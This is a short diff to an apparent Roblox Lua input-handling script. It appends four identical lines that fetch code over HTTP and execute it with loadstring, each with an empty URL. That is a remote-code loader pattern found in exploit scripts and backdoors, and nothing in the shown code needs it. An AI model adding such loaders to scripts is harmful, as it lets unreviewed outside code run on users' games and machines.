@@ -148,3 +148,8 @@ UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
         end
     end
 end)
+
+loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet(""))()
